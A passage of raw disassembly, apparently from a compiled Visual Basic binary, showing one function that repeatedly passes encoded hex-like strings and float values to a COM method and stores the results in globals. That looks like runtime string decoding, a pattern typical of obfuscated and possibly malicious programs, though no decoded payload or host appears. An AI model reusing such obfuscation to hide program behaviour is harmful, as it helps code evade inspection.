.text:0040AB60 loc_40AB60:                             ; CODE XREF: sub_40A806+34E↑j
.text:0040AB60                 mov     eax, [ebp+var_9C]
.text:0040AB66                 mov     eax, [eax]
.text:0040AB68                 mov     [ebp+var_1C], eax
.text:0040AB6B                 fld1
.text:0040AB6D                 fstp    [ebp+var_18]
.text:0040AB70                 lea     eax, [ebp+var_14]
.text:0040AB73                 push    eax
.text:0040AB74                 push    0
.text:0040AB76                 lea     eax, [ebp+var_18]
.text:0040AB79                 push    eax
.text:0040AB7A                 push    offset a6d6d652f333473 ; "-6d6d652f333473667456"
.text:0040AB7F                 mov     eax, [ebp+var_1C]
.text:0040AB82                 mov     eax, [eax]
.text:0040AB84                 push    [ebp+var_1C]
.text:0040AB87                 call    dword ptr [eax+24h]
.text:0040AB8A                 fnclex
.text:0040AB8C                 mov     [ebp+var_20], eax
.text:0040AB8F                 cmp     [ebp+var_20], 0
.text:0040AB93                 jge     short loc_40ABAF
.text:0040AB95                 push    24h ; '$'
.text:0040AB97                 push    offset dword_4027CC
.text:0040AB9C                 push    [ebp+var_1C]
.text:0040AB9F                 push    [ebp+var_20]
.text:0040ABA2                 call    __vbaHresultCheckObj
.text:0040ABA7                 mov     [ebp+var_A0], eax
.text:0040ABAD                 jmp     short loc_40ABB6
.text:0040ABAF ; ---------------------------------------------------------------------------
.text:0040ABAF
.text:0040ABAF loc_40ABAF:                             ; CODE XREF: sub_40A806+38D↑j
.text:0040ABAF                 and     [ebp+var_A0], 0
.text:0040ABB6
.text:0040ABB6 loc_40ABB6:                             ; CODE XREF: sub_40A806+3A7↑j
.text:0040ABB6                 mov     eax, [ebp+var_14]
.text:0040ABB9                 mov     [ebp+var_3C], eax
.text:0040ABBC                 and     [ebp+var_14], 0
.text:0040ABC0                 mov     edx, [ebp+var_3C]
.text:0040ABC3                 mov     ecx, offset unk_40E148
.text:0040ABC8                 call    __vbaStrMove
.text:0040ABCD                 cmp     dword_40E0AC, 0
.text:0040ABD4                 jnz     short loc_40ABF1
.text:0040ABD6                 push    offset dword_40E0AC
.text:0040ABDB                 push    offset dword_401960
.text:0040ABE0                 call    __vbaNew2
.text:0040ABE5                 mov     [ebp+var_A4], offset dword_40E0AC
.text:0040ABEF                 jmp     short loc_40ABFB
.text:0040ABF1 ; ---------------------------------------------------------------------------
.text:0040ABF1
.text:0040ABF1 loc_40ABF1:                             ; CODE XREF: sub_40A806+3CE↑j
.text:0040ABF1                 mov     [ebp+var_A4], offset dword_40E0AC
.text:0040ABFB
.text:0040ABFB loc_40ABFB:                             ; CODE XREF: sub_40A806+3E9↑j
.text:0040ABFB                 mov     eax, [ebp+var_A4]
.text:0040AC01                 mov     eax, [eax]
.text:0040AC03                 mov     [ebp+var_1C], eax
.text:0040AC06                 fld     ds:flt_4012B0
.text:0040AC0C                 fstp    [ebp+var_18]
.text:0040AC0F                 lea     eax, [ebp+var_14]
.text:0040AC12                 push    eax
.text:0040AC13                 push    0
.text:0040AC15                 lea     eax, [ebp+var_18]
.text:0040AC18                 push    eax
.text:0040AC19                 push    offset aU828e8b8b608b8 ; "U828e8b8b608b809493918875"
.text:0040AC1E                 mov     eax, [ebp+var_1C]
.text:0040AC21                 mov     eax, [eax]
.text:0040AC23                 push    [ebp+var_1C]
.text:0040AC26                 call    dword ptr [eax+24h]
.text:0040AC29                 fnclex
.text:0040AC2B                 mov     [ebp+var_20], eax
.text:0040AC2E                 cmp     [ebp+var_20], 0
.text:0040AC32                 jge     short loc_40AC4E
.text:0040AC34                 push    24h ; '$'
.text:0040AC36                 push    offset dword_4027CC
.text:0040AC3B                 push    [ebp+var_1C]
.text:0040AC3E                 push    [ebp+var_20]
.text:0040AC41                 call    __vbaHresultCheckObj
.text:0040AC46                 mov     [ebp+var_A8], eax
.text:0040AC4C                 jmp     short loc_40AC55
.text:0040AC4E ; ---------------------------------------------------------------------------
.text:0040AC4E
.text:0040AC4E loc_40AC4E:                             ; CODE XREF: sub_40A806+42C↑j
.text:0040AC4E                 and     [ebp+var_A8], 0
.text:0040AC55
.text:0040AC55 loc_40AC55:                             ; CODE XREF: sub_40A806+446↑j
.text:0040AC55                 mov     eax, [ebp+var_14]
.text:0040AC58                 mov     [ebp+var_40], eax
.text:0040AC5B                 and     [ebp+var_14], 0
.text:0040AC5F                 mov     edx, [ebp+var_40]
.text:0040AC62                 mov     ecx, offset unk_40E128
.text:0040AC67                 call    __vbaStrMove
.text:0040AC6C                 cmp     dword_40E0AC, 0
.text:0040AC73                 jnz     short loc_40AC90
.text:0040AC75                 push    offset dword_40E0AC
.text:0040AC7A                 push    offset dword_401960
.text:0040AC7F                 call    __vbaNew2
.text:0040AC84                 mov     [ebp+var_AC], offset dword_40E0AC
.text:0040AC8E                 jmp     short loc_40AC9A
.text:0040AC90 ; ---------------------------------------------------------------------------
.text:0040AC90
.text:0040AC90 loc_40AC90:                             ; CODE XREF: sub_40A806+46D↑j
.text:0040AC90                 mov     [ebp+var_AC], offset dword_40E0AC
.text:0040AC9A
.text:0040AC9A loc_40AC9A:                             ; CODE XREF: sub_40A806+488↑j
.text:0040AC9A                 mov     eax, [ebp+var_AC]
.text:0040ACA0                 mov     eax, [eax]
.text:0040ACA2                 mov     [ebp+var_1C], eax
.text:0040ACA5                 fld     ds:flt_4012AC
.text:0040ACAB                 fstp    [ebp+var_18]
.text:0040ACAE                 lea     eax, [ebp+var_14]
.text:0040ACB1                 push    eax
.text:0040ACB2                 push    0
.text:0040ACB4                 lea     eax, [ebp+var_18]
.text:0040ACB7                 push    eax
.text:0040ACB8                 push    offset aQ877a557d865e ; "Q877a557d865e"
.text:0040ACBD                 mov     eax, [ebp+var_1C]
.text:0040ACC0                 mov     eax, [eax]
.text:0040ACC2                 push    [ebp+var_1C]
.text:0040ACC5                 call    dword ptr [eax+24h]
.text:0040ACC8                 fnclex
.text:0040ACCA                 mov     [ebp+var_20], eax
.text:0040ACCD                 cmp     [ebp+var_20], 0
.text:0040ACD1                 jge     short loc_40ACED
.text:0040ACD3                 push    24h ; '$'
.text:0040ACD5                 push    offset dword_4027CC
.text:0040ACDA                 push    [ebp+var_1C]
.text:0040ACDD                 push    [ebp+var_20]
.text:0040ACE0                 call    __vbaHresultCheckObj
.text:0040ACE5                 mov     [ebp+var_B0], eax
.text:0040ACEB                 jmp     short loc_40ACF4
.text:0040ACED ; ---------------------------------------------------------------------------
.text:0040ACED
.text:0040ACED loc_40ACED:                             ; CODE XREF: sub_40A806+4CB↑j
.text:0040ACED                 and     [ebp+var_B0], 0
.text:0040ACF4
.text:0040ACF4 loc_40ACF4:                             ; CODE XREF: sub_40A806+4E5↑j
.text:0040ACF4                 mov     eax, [ebp+var_14]
.text:0040ACF7                 mov     [ebp+var_44], eax
.text:0040ACFA                 and     [ebp+var_14], 0
.text:0040ACFE                 mov     edx, [ebp+var_44]
.text:0040AD01                 mov     ecx, offset unk_40E108
.text:0040AD06                 call    __vbaStrMove
.text:0040AD0B                 cmp     dword_40E0AC, 0
.text:0040AD12                 jnz     short loc_40AD2F
.text:0040AD14                 push    offset dword_40E0AC
.text:0040AD19                 push    offset dword_401960
.text:0040AD1E                 call    __vbaNew2
.text:0040AD23                 mov     [ebp+var_B4], offset dword_40E0AC
.text:0040AD2D                 jmp     short loc_40AD39
.text:0040AD2F ; ---------------------------------------------------------------------------
.text:0040AD2F
.text:0040AD2F loc_40AD2F:                             ; CODE XREF: sub_40A806+50C↑j
.text:0040AD2F                 mov     [ebp+var_B4], offset dword_40E0AC
.text:0040AD39
.text:0040AD39 loc_40AD39:                             ; CODE XREF: sub_40A806+527↑j
.text:0040AD39                 mov     eax, [ebp+var_B4]
.text:0040AD3F                 mov     eax, [eax]
.text:0040AD41                 mov     [ebp+var_1C], eax
.text:0040AD44                 fld     ds:flt_4012A8
.text:0040AD4A                 fstp    [ebp+var_18]
.text:0040AD4D                 lea     eax, [ebp+var_14]
.text:0040AD50                 push    eax
.text:0040AD51                 push    0
.text:0040AD53                 lea     eax, [ebp+var_18]
.text:0040AD56                 push    eax
.text:0040AD57                 push    offset aR8894a0a381a8a ; "R8894a0a381a8a0959f9a889d9d9274"
.text:0040AD5C                 mov     eax, [ebp+var_1C]
.text:0040AD5F                 mov     eax, [eax]
.text:0040AD61                 push    [ebp+var_1C]
.text:0040AD64                 call    dword ptr [eax+24h]
.text:0040AD67                 fnclex
.text:0040AD69                 mov     [ebp+var_20], eax
.text:0040AD6C                 cmp     [ebp+var_20], 0
.text:0040AD70                 jge     short loc_40AD8C
.text:0040AD72                 push    24h ; '$'
.text:0040AD74                 push    offset dword_4027CC
.text:0040AD79                 push    [ebp+var_1C]
.text:0040AD7C                 push    [ebp+var_20]
.text:0040AD7F                 call    __vbaHresultCheckObj
.text:0040AD84                 mov     [ebp+var_B8], eax
.text:0040AD8A                 jmp     short loc_40AD93
.text:0040AD8C ; ---------------------------------------------------------------------------
.text:0040AD8C
.text:0040AD8C loc_40AD8C:                             ; CODE XREF: sub_40A806+56A↑j
.text:0040AD8C                 and     [ebp+var_B8], 0
.text:0040AD93
.text:0040AD93 loc_40AD93:                             ; CODE XREF: sub_40A806+584↑j
.text:0040AD93                 mov     eax, [ebp+var_14]
.text:0040AD96                 mov     [ebp+var_48], eax
.text:0040AD99                 and     [ebp+var_14], 0
.text:0040AD9D                 mov     edx, [ebp+var_48]
.text:0040ADA0                 mov     ecx, offset unk_40E0FC
.text:0040ADA5                 call    __vbaStrMove
.text:0040ADAA                 cmp     dword_40E0AC, 0
.text:0040ADB1                 jnz     short loc_40ADCE
.text:0040ADB3                 push    offset dword_40E0AC
.text:0040ADB8                 push    offset dword_401960
.text:0040ADBD                 call    __vbaNew2
.text:0040ADC2                 mov     [ebp+var_BC], offset dword_40E0AC
.text:0040ADCC                 jmp     short loc_40ADD8
.text:0040ADCE ; ---------------------------------------------------------------------------
.text:0040ADCE
.text:0040ADCE loc_40ADCE:                             ; CODE XREF: sub_40A806+5AB↑j
.text:0040ADCE                 mov     [ebp+var_BC], offset dword_40E0AC
.text:0040ADD8
.text:0040ADD8 loc_40ADD8:                             ; CODE XREF: sub_40A806+5C6↑j
.text:0040ADD8                 mov     eax, [ebp+var_BC]
.text:0040ADDE                 mov     eax, [eax]
.text:0040ADE0                 mov     [ebp+var_1C], eax
.text:0040ADE3                 fld     ds:flt_4012A4
.text:0040ADE9                 fstp    [ebp+var_18]
.text:0040ADEC                 lea     eax, [ebp+var_14]
.text:0040ADEF                 push    eax
.text:0040ADF0                 push    0
.text:0040ADF2                 lea     eax, [ebp+var_18]
.text:0040ADF5                 push    eax
.text:0040ADF6                 push    offset aS8c8c846e70768 ; "s8c8c846e70768d968296938d"
.text:0040ADFB                 mov     eax, [ebp+var_1C]
.text:0040ADFE                 mov     eax, [eax]
.text:0040AE00                 push    [ebp+var_1C]
.text:0040AE03                 call    dword ptr [eax+24h]
.text:0040AE06                 fnclex
.text:0040AE08                 mov     [ebp+var_20], eax
.text:0040AE0B                 cmp     [ebp+var_20], 0
.text:0040AE0F                 jge     short loc_40AE2B
.text:0040AE11                 push    24h ; '$'
.text:0040AE13                 push    offset dword_4027CC
.text:0040AE18                 push    [ebp+var_1C]
.text:0040AE1B                 push    [ebp+var_20]
.text:0040AE1E                 call    __vbaHresultCheckObj
.text:0040AE23                 mov     [ebp+var_C0], eax
.text:0040AE29                 jmp     short loc_40AE32
.text:0040AE2B ; ---------------------------------------------------------------------------
.text:0040AE2B
.text:0040AE2B loc_40AE2B:                             ; CODE XREF: sub_40A806+609↑j
.text:0040AE2B                 and     [ebp+var_C0], 0
.text:0040AE32
.text:0040AE32 loc_40AE32:                             ; CODE XREF: sub_40A806+623↑j
.text:0040AE32                 mov     eax, [ebp+var_14]
.text:0040AE35                 mov     [ebp+var_4C], eax
.text:0040AE38                 and     [ebp+var_14], 0
.text:0040AE3C                 mov     edx, [ebp+var_4C]
.text:0040AE3F                 mov     ecx, offset unk_40E110
.text:0040AE44                 call    __vbaStrMove
.text:0040AE49                 cmp     dword_40E0AC, 0
.text:0040AE50                 jnz     short loc_40AE6D
.text:0040AE52                 push    offset dword_40E0AC
.text:0040AE57                 push    offset dword_401960
.text:0040AE5C                 call    __vbaNew2
.text:0040AE61                 mov     [ebp+var_C4], offset dword_40E0AC
.text:0040AE6B                 jmp     short loc_40AE77
.text:0040AE6D ; ---------------------------------------------------------------------------
.text:0040AE6D
.text:0040AE6D loc_40AE6D:                             ; CODE XREF: sub_40A806+64A↑j
.text:0040AE6D                 mov     [ebp+var_C4], offset dword_40E0AC
.text:0040AE77
.text:0040AE77 loc_40AE77:                             ; CODE XREF: sub_40A806+665↑j
.text:0040AE77                 mov     eax, [ebp+var_C4]
.text:0040AE7D                 mov     eax, [eax]
.text:0040AE7F                 mov     [ebp+var_1C], eax
.text:0040AE82                 push    offset sub_40D26B
.text:0040AE87                 push    offset unk_40E108
.text:0040AE8C                 push    offset dword_40E078
.text:0040AE91                 mov     eax, [ebp+var_1C]
.text:0040AE94                 mov     eax, [eax]
.text:0040AE96                 push    [ebp+var_1C]
.text:0040AE99                 call    dword ptr [eax+20h]
.text:0040AE9C                 fnclex
.text:0040AE9E                 mov     [ebp+var_20], eax
.text:0040AEA1                 cmp     [ebp+var_20], 0
.text:0040AEA5                 jge     short loc_40AEC1
.text:0040AEA7                 push    20h ; ' '
.text:0040AEA9                 push    offset dword_4027CC
.text:0040AEAE                 push    [ebp+var_1C]
.text:0040AEB1                 push    [ebp+var_20]
.text:0040AEB4                 call    __vbaHresultCheckObj
.text:0040AEB9                 mov     [ebp+var_C8], eax
.text:0040AEBF                 jmp     short loc_40AEC8
.text:0040AEC1 ; ---------------------------------------------------------------------------
.text:0040AEC1
.text:0040AEC1 loc_40AEC1:                             ; CODE XREF: sub_40A806+69F↑j
.text:0040AEC1                 and     [ebp+var_C8], 0
.text:0040AEC8
.text:0040AEC8 loc_40AEC8:                             ; CODE XREF: sub_40A806+6B9↑j
.text:0040AEC8                 cmp     dword_40E0AC, 0
.text:0040AECF                 jnz     short loc_40AEEC
.text:0040AED1                 push    offset dword_40E0AC
.text:0040AED6                 push    offset dword_401960
.text:0040AEDB                 call    __vbaNew2
.text:0040AEE0                 mov     [ebp+var_CC], offset dword_40E0AC
.text:0040AEEA                 jmp     short loc_40AEF6
.text:0040AEEC ; ---------------------------------------------------------------------------
.text:0040AEEC
.text:0040AEEC loc_40AEEC:                             ; CODE XREF: sub_40A806+6C9↑j
.text:0040AEEC                 mov     [ebp+var_CC], offset dword_40E0AC
.text:0040AEF6
.text:0040AEF6 loc_40AEF6:                             ; CODE XREF: sub_40A806+6E4↑j
.text:0040AEF6                 mov     eax, [ebp+var_CC]
.text:0040AEFC                 mov     eax, [eax]
.text:0040AEFE                 mov     [ebp+var_1C], eax
.text:0040AF01                 fld     ds:flt_4011E8
.text:0040AF07                 fstp    [ebp+var_18]
.text:0040AF0A                 lea     eax, [ebp+var_14]
.text:0040AF0D                 push    eax
.text:0040AF0E                 push    0
.text:0040AF10                 lea     eax, [ebp+var_18]
.text:0040AF13                 push    eax
.text:0040AF14                 push    offset aQ687b683175687 ; "q687b6831756875726f737b68"
.text:0040AF19                 mov     eax, [ebp+var_1C]
.text:0040AF1C                 mov     eax, [eax]
.text:0040AF1E                 push    [ebp+var_1C]
.text:0040AF21                 call    dword ptr [eax+24h]
.text:0040AF24                 fnclex
.text:0040AF26                 mov     [ebp+var_20], eax
.text:0040AF29                 cmp     [ebp+var_20], 0
.text:0040AF2D                 jge     short loc_40AF49
.text:0040AF2F                 push    24h ; '$'
.text:0040AF31                 push    offset dword_4027CC
.text:0040AF36                 push    [ebp+var_1C]
.text:0040AF39                 push    [ebp+var_20]
.text:0040AF3C                 call    __vbaHresultCheckObj
.text:0040AF41                 mov     [ebp+var_D0], eax
.text:0040AF47                 jmp     short loc_40AF50
.text:0040AF49 ; ---------------------------------------------------------------------------
.text:0040AF49
.text:0040AF49 loc_40AF49:                             ; CODE XREF: sub_40A806+727↑j
.text:0040AF49                 and     [ebp+var_D0], 0
.text:0040AF50
.text:0040AF50 loc_40AF50:                             ; CODE XREF: sub_40A806+741↑j
.text:0040AF50                 mov     eax, [ebp+var_14]
.text:0040AF53                 mov     [ebp+var_50], eax
.text:0040AF56                 and     [ebp+var_14], 0
.text:0040AF5A                 mov     edx, [ebp+var_50]
.text:0040AF5D                 mov     ecx, offset unk_40E0D8
.text:0040AF62                 call    __vbaStrMove
.text:0040AF67                 cmp     dword_40E0AC, 0
.text:0040AF6E                 jnz     short loc_40AF8B
.text:0040AF70                 push    offset dword_40E0AC
.text:0040AF75                 push    offset dword_401960
.text:0040AF7A                 call    __vbaNew2
.text:0040AF7F                 mov     [ebp+var_D4], offset dword_40E0AC
.text:0040AF89                 jmp     short loc_40AF95
.text:0040AF8B ; ---------------------------------------------------------------------------
.text:0040AF8B
.text:0040AF8B loc_40AF8B:                             ; CODE XREF: sub_40A806+768↑j
.text:0040AF8B                 mov     [ebp+var_D4], offset dword_40E0AC
.text:0040AF95
.text:0040AF95 loc_40AF95:                             ; CODE XREF: sub_40A806+783↑j
.text:0040AF95                 mov     eax, [ebp+var_D4]
.text:0040AF9B                 mov     eax, [eax]
.text:0040AF9D                 mov     [ebp+var_1C], eax
.text:0040AFA0                 fld     ds:flt_4012A0
.text:0040AFA6                 fstp    [ebp+var_18]
.text:0040AFA9                 lea     eax, [ebp+var_14]
.text:0040AFAC                 push    eax
.text:0040AFAD                 push    0
.text:0040AFAF                 lea     eax, [ebp+var_18]
.text:0040AFB2                 push    eax
.text:0040AFB3                 push    offset aR8a817c86818f ; "R8a817c86818f"
.text:0040AFB8                 mov     eax, [ebp+var_1C]
.text:0040AFBB                 mov     eax, [eax]
.text:0040AFBD                 push    [ebp+var_1C]
.text:0040AFC0                 call    dword ptr [eax+24h]
.text:0040AFC3                 fnclex
.text:0040AFC5                 mov     [ebp+var_20], eax
.text:0040AFC8                 cmp     [ebp+var_20], 0
.text:0040AFCC                 jge     short loc_40AFE8
.text:0040AFCE                 push    24h ; '$'
.text:0040AFD0                 push    offset dword_4027CC
.text:0040AFD5                 push    [ebp+var_1C]
.text:0040AFD8                 push    [ebp+var_20]
.text:0040AFDB                 call    __vbaHresultCheckObj
.text:0040AFE0                 mov     [ebp+var_D8], eax
.text:0040AFE6                 jmp     short loc_40AFEF
.text:0040AFE8 ; ---------------------------------------------------------------------------
.text:0040AFE8
.text:0040AFE8 loc_40AFE8:                             ; CODE XREF: sub_40A806+7C6↑j
.text:0040AFE8                 and     [ebp+var_D8], 0
.text:0040AFEF
.text:0040AFEF loc_40AFEF:                             ; CODE XREF: sub_40A806+7E0↑j
.text:0040AFEF                 mov     eax, [ebp+var_14]
.text:0040AFF2                 mov     [ebp+var_54], eax
.text:0040AFF5                 and     [ebp+var_14], 0
.text:0040AFF9                 mov     edx, [ebp+var_54]
.text:0040AFFC                 mov     ecx, offset unk_40E0F0
.text:0040B001                 call    __vbaStrMove
.text:0040B006                 cmp     dword_40E0AC, 0
.text:0040B00D                 jnz     short loc_40B02A
.text:0040B00F                 push    offset dword_40E0AC
.text:0040B014                 push    offset dword_401960
.text:0040B019                 call    __vbaNew2
.text:0040B01E                 mov     [ebp+var_DC], offset dword_40E0AC
.text:0040B028                 jmp     short loc_40B034
.text:0040B02A ; ---------------------------------------------------------------------------
.text:0040B02A
.text:0040B02A loc_40B02A:                             ; CODE XREF: sub_40A806+807↑j
.text:0040B02A                 mov     [ebp+var_DC], offset dword_40E0AC
.text:0040B034
.text:0040B034 loc_40B034:                             ; CODE XREF: sub_40A806+822↑j
.text:0040B034                 mov     eax, [ebp+var_DC]
.text:0040B03A                 mov     eax, [eax]
.text:0040B03C                 mov     [ebp+var_1C], eax
.text:0040B03F                 fld     ds:flt_40121C
.text:0040B045                 fstp    [ebp+var_18]
.text:0040B048                 lea     eax, [ebp+var_14]
.text:0040B04B                 push    eax
.text:0040B04C                 push    0
.text:0040B04E                 lea     eax, [ebp+var_18]
.text:0040B051                 push    eax
.text:0040B052                 push    offset aU7d53548e86959 ; "u7d53548e8695949a94"
.text:0040B057                 mov     eax, [ebp+var_1C]
.text:0040B05A                 mov     eax, [eax]
.text:0040B05C                 push    [ebp+var_1C]
.text:0040B05F                 call    dword ptr [eax+24h]
.text:0040B062                 fnclex
.text:0040B064                 mov     [ebp+var_20], eax
.text:0040B067                 cmp     [ebp+var_20], 0
.text:0040B06B                 jge     short loc_40B087
.text:0040B06D                 push    24h ; '$'
.text:0040B06F                 push    offset dword_4027CC
.text:0040B074                 push    [ebp+var_1C]
.text:0040B077                 push    [ebp+var_20]
.text:0040B07A                 call    __vbaHresultCheckObj
.text:0040B07F                 mov     [ebp+var_E0], eax
.text:0040B085                 jmp     short loc_40B08E
.text:0040B087 ; ---------------------------------------------------------------------------
.text:0040B087
.text:0040B087 loc_40B087:                             ; CODE XREF: sub_40A806+865↑j
.text:0040B087                 and     [ebp+var_E0], 0
.text:0040B08E
.text:0040B08E loc_40B08E:                             ; CODE XREF: sub_40A806+87F↑j
.text:0040B08E                 mov     eax, [ebp+var_14]
.text:0040B091                 mov     [ebp+var_58], eax
.text:0040B094                 and     [ebp+var_14], 0
.text:0040B098                 mov     edx, [ebp+var_58]
.text:0040B09B                 mov     ecx, offset unk_40E0D4
.text:0040B0A0                 call    __vbaStrMove
.text:0040B0A5                 cmp     dword_40E0AC, 0
.text:0040B0AC                 jnz     short loc_40B0C9
.text:0040B0AE                 push    offset dword_40E0AC
.text:0040B0B3                 push    offset dword_401960
.text:0040B0B8                 call    __vbaNew2
.text:0040B0BD                 mov     [ebp+var_E4], offset dword_40E0AC
.text:0040B0C7                 jmp     short loc_40B0D3
.text:0040B0C9 ; ---------------------------------------------------------------------------
.text:0040B0C9
.text:0040B0C9 loc_40B0C9:                             ; CODE XREF: sub_40A806+8A6↑j
.text:0040B0C9                 mov     [ebp+var_E4], offset dword_40E0AC
.text:0040B0D3
.text:0040B0D3 loc_40B0D3:                             ; CODE XREF: sub_40A806+8C1↑j
.text:0040B0D3                 mov     eax, [ebp+var_E4]
.text:0040B0D9                 mov     eax, [eax]
.text:0040B0DB                 mov     [ebp+var_1C], eax
.text:0040B0DE                 fld     ds:flt_401204
.text:0040B0E4                 fstp    [ebp+var_18]
.text:0040B0E7                 lea     eax, [ebp+var_14]
.text:0040B0EA                 push    eax
.text:0040B0EB                 push    0
.text:0040B0ED                 lea     eax, [ebp+var_18]
.text:0040B0F0                 push    eax
.text:0040B0F1                 push    offset aS798c794282837 ; "S798c794282837b8380827d8b"
.text:0040B0F6                 mov     eax, [ebp+var_1C]
.text:0040B0F9                 mov     eax, [eax]
.text:0040B0FB                 push    [ebp+var_1C]
.text:0040B0FE                 call    dword ptr [eax+24h]
.text:0040B101                 fnclex
.text:0040B103                 mov     [ebp+var_20], eax
.text:0040B106                 cmp     [ebp+var_20], 0
.text:0040B10A                 jge     short loc_40B126
.text:0040B10C                 push    24h ; '$'
.text:0040B10E                 push    offset dword_4027CC
.text:0040B113                 push    [ebp+var_1C]
.text:0040B116                 push    [ebp+var_20]
.text:0040B119                 call    __vbaHresultCheckObj
.text:0040B11E                 mov     [ebp+var_E8], eax
.text:0040B124                 jmp     short loc_40B12D
.text:0040B126 ; ---------------------------------------------------------------------------
.text:0040B126
.text:0040B126 loc_40B126:                             ; CODE XREF: sub_40A806+904↑j
.text:0040B126                 and     [ebp+var_E8], 0
.text:0040B12D
.text:0040B12D loc_40B12D:                             ; CODE XREF: sub_40A806+91E↑j
.text:0040B12D                 mov     eax, [ebp+var_14]
.text:0040B130                 mov     [ebp+var_5C], eax
.text:0040B133                 and     [ebp+var_14], 0
.text:0040B137                 mov     edx, [ebp+var_5C]
.text:0040B13A                 mov     ecx, offset unk_40E0C8
.text:0040B13F                 call    __vbaStrMove
.text:0040B144                 cmp     dword_40E0AC, 0
.text:0040B14B                 jnz     short loc_40B168
.text:0040B14D                 push    offset dword_40E0AC
.text:0040B152                 push    offset dword_401960
.text:0040B157                 call    __vbaNew2
.text:0040B15C                 mov     [ebp+var_EC], offset dword_40E0AC
.text:0040B166                 jmp     short loc_40B172
.text:0040B168 ; ---------------------------------------------------------------------------
.text:0040B168
.text:0040B168 loc_40B168:                             ; CODE XREF: sub_40A806+945↑j
.text:0040B168                 mov     [ebp+var_EC], offset dword_40E0AC
.text:0040B172
.text:0040B172 loc_40B172:                             ; CODE XREF: sub_40A806+960↑j
.text:0040B172                 mov     eax, [ebp+var_EC]
.text:0040B178                 mov     eax, [eax]
.text:0040B17A                 mov     [ebp+var_1C], eax
.text:0040B17D                 fld     ds:flt_401208
.text:0040B183                 fstp    [ebp+var_18]
.text:0040B186                 lea     eax, [ebp+var_14]
.text:0040B189                 push    eax
.text:0040B18A                 push    0
.text:0040B18C                 lea     eax, [ebp+var_18]
.text:0040B18F                 push    eax
.text:0040B190                 push    offset aC3d6c38cd2d1cd ; "/c3d6c38cd2d1cdc6c1d4d1"
.text:0040B195                 mov     eax, [ebp+var_1C]
.text:0040B198                 mov     eax, [eax]
.text:0040B19A                 push    [ebp+var_1C]
.text:0040B19D                 call    dword ptr [eax+24h]
.text:0040B1A0                 fnclex
.text:0040B1A2                 mov     [ebp+var_20], eax
.text:0040B1A5                 cmp     [ebp+var_20], 0
.text:0040B1A9                 jge     short loc_40B1C5
.text:0040B1AB                 push    24h ; '$'
.text:0040B1AD                 push    offset dword_4027CC
.text:0040B1B2                 push    [ebp+var_1C]
.text:0040B1B5                 push    [ebp+var_20]
.text:0040B1B8                 call    __vbaHresultCheckObj
.text:0040B1BD                 mov     [ebp+var_F0], eax
.text:0040B1C3                 jmp     short loc_40B1CC
.text:0040B1C5 ; ---------------------------------------------------------------------------
.text:0040B1C5
.text:0040B1C5 loc_40B1C5:                             ; CODE XREF: sub_40A806+9A3↑j
.text:0040B1C5                 and     [ebp+var_F0], 0
.text:0040B1CC
.text:0040B1CC loc_40B1CC:                             ; CODE XREF: sub_40A806+9BD↑j
.text:0040B1CC                 mov     eax, [ebp+var_14]
.text:0040B1CF                 mov     [ebp+var_60], eax
.text:0040B1D2                 and     [ebp+var_14], 0
.text:0040B1D6                 mov     edx, [ebp+var_60]
.text:0040B1D9                 mov     ecx, offset unk_40E0A8
.text:0040B1DE                 call    __vbaStrMove
.text:0040B1E3                 cmp     dword_40E0AC, 0
.text:0040B1EA                 jnz     short loc_40B207
.text:0040B1EC                 push    offset dword_40E0AC
.text:0040B1F1                 push    offset dword_401960
.text:0040B1F6                 call    __vbaNew2
.text:0040B1FB                 mov     [ebp+var_F4], offset dword_40E0AC
.text:0040B205                 jmp     short loc_40B211
.text:0040B207 ; ---------------------------------------------------------------------------
.text:0040B207
.text:0040B207 loc_40B207:                             ; CODE XREF: sub_40A806+9E4↑j
.text:0040B207                 mov     [ebp+var_F4], offset dword_40E0AC
.text:0040B211
.text:0040B211 loc_40B211:                             ; CODE XREF: sub_40A806+9FF↑j
.text:0040B211                 mov     eax, [ebp+var_F4]
.text:0040B217                 mov     eax, [eax]
.text:0040B219                 mov     [ebp+var_1C], eax
.text:0040B21C                 fld     ds:flt_40129C
.text:0040B222                 fstp    [ebp+var_18]
.text:0040B225                 lea     eax, [ebp+var_14]
.text:0040B228                 push    eax
.text:0040B229                 push    0
.text:0040B22B                 lea     eax, [ebp+var_18]
.text:0040B22E                 push    eax
.text:0040B22F                 push    offset aG8b     ; "g8b"
.text:0040B234                 mov     eax, [ebp+var_1C]
.text:0040B237                 mov     eax, [eax]
.text:0040B239                 push    [ebp+var_1C]
.text:0040B23C                 call    dword ptr [eax+24h]
.text:0040B23F                 fnclex
.text:0040B241                 mov     [ebp+var_20], eax
.text:0040B244                 cmp     [ebp+var_20], 0
.text:0040B248                 jge     short loc_40B264
.text:0040B24A                 push    24h ; '$'
.text:0040B24C                 push    offset dword_4027CC
.text:0040B251                 push    [ebp+var_1C]
.text:0040B254                 push    [ebp+var_20]
.text:0040B257                 call    __vbaHresultCheckObj
.text:0040B25C                 mov     [ebp+var_F8], eax
.text:0040B262                 jmp     short loc_40B26B
.text:0040B264 ; ---------------------------------------------------------------------------
.text:0040B264
.text:0040B264 loc_40B264:                             ; CODE XREF: sub_40A806+A42↑j
.text:0040B264                 and     [ebp+var_F8], 0
.text:0040B26B
.text:0040B26B loc_40B26B:                             ; CODE XREF: sub_40A806+A5C↑j
.text:0040B26B                 mov     eax, [ebp+var_14]
.text:0040B26E                 mov     [ebp+var_64], eax
.text:0040B271                 and     [ebp+var_14], 0
.text:0040B275                 mov     edx, [ebp+var_64]
.text:0040B278                 mov     ecx, offset dword_40E0D0
.text:0040B27D                 call    __vbaStrMove
.text:0040B282                 cmp     dword_40E0AC, 0
.text:0040B289                 jnz     short loc_40B2A6
.text:0040B28B                 push    offset dword_40E0AC
.text:0040B290                 push    offset dword_401960
.text:0040B295                 call    __vbaNew2
.text:0040B29A                 mov     [ebp+var_FC], offset dword_40E0AC
.text:0040B2A4                 jmp     short loc_40B2B0
.text:0040B2A6 ; ---------------------------------------------------------------------------
.text:0040B2A6
.text:0040B2A6 loc_40B2A6:                             ; CODE XREF: sub_40A806+A83↑j
.text:0040B2A6                 mov     [ebp+var_FC], offset dword_40E0AC
.text:0040B2B0
.text:0040B2B0 loc_40B2B0:                             ; CODE XREF: sub_40A806+A9E↑j
.text:0040B2B0                 mov     eax, [ebp+var_FC]
.text:0040B2B6                 mov     eax, [eax]
.text:0040B2B8                 mov     [ebp+var_1C], eax
.text:0040B2BB                 fld     ds:flt_401298
.text:0040B2C1                 fstp    [ebp+var_18]
.text:0040B2C4                 lea     eax, [ebp+var_14]
.text:0040B2C7                 push    eax
.text:0040B2C8                 push    0
.text:0040B2CA                 lea     eax, [ebp+var_18]
